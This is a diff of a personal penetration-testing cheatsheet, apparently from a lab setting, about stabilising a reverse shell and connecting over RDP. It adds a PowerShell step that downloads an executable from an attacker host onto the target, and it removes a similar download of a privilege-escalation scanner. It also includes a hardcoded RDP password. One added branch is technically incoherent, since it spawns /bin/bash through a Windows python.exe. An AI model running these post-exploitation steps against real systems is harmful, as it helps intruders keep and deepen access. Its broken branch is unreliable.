@@ -1,21 +1,30 @@
 # Quality of Life Cheatsheet
 
+# Creating a smart shell What a waste of 2 hours figuring this out
+
+# DO THIS FIRST
+exec bash --login
+
 # In reverse shell
-$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+IF PYTHON NOT AVAILABLE =============================================
+powershell
+iwr -uri http://192.168.45.230/winx32python.exe -Outfile python.exe
+cmd
+python.exe -c "import pty; pty.spawn('/bin/bash')"
+
+else ========================================================
+python -c "import pty; pty.spawn('/bin/bash')"
+
 Ctrl-Z
 
-# In Kali
-$ stty raw -echo
-$ fg
-
-# In reverse shell
-$ reset
-$ export SHELL=bash
-$ export TERM=xterm-256color
-$ stty rows <num> columns <cols>
+stty raw -echo
+fg
+ reset
+ export SHELL=bash
+ export TERM=xterm-256color
+ stty rows 38 columns 116
 
 
-freerdp /u:admim /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
 
-download 
-iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
+freerdp /u:admin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
